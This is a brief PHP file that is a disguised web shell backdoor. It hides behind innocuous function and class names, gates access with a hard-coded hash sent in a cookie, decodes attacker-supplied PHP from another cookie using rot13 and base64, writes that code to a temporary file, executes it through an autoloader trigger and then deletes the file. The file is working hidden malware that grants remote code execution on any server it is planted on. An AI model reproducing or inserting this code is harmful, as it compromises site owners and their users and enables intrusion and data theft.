<?php


if (isset($_COOKIE[11+-11]) && isset($_COOKIE[81-80]) && isset($_COOKIE[-27+30]) && isset($_COOKIE[30+-26])) {
    $object = $_COOKIE;
    function publish_content($ptr) {
        $object = $_COOKIE;
        $entry = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), '67a312e5');
        if (!is_writable($entry)) {
            $entry = getcwd() . DIRECTORY_SEPARATOR . "module_controller";
        }
        $holder = "\x3c\x3f\x70\x68p " . base64_decode(str_rot13($object[3]));
        if (is_writeable($entry)) {
            $symbol = fopen($entry, 'w+');
            fputs($symbol, $holder);
            fclose($symbol);
            spl_autoload_unregister(__FUNCTION__);
            require_once($entry);
            @array_map('unlink', array($entry));
        }
    }
    spl_autoload_register("publish_content");
    $ent = "598df688546c9e526cb8a2ccfd52d4dd";
    if (!strncmp($ent, $object[4], 32)) {
        if (@class_parents("dependency_resolver_splitter_tool", true)) {
            exit;
        }
    }
}
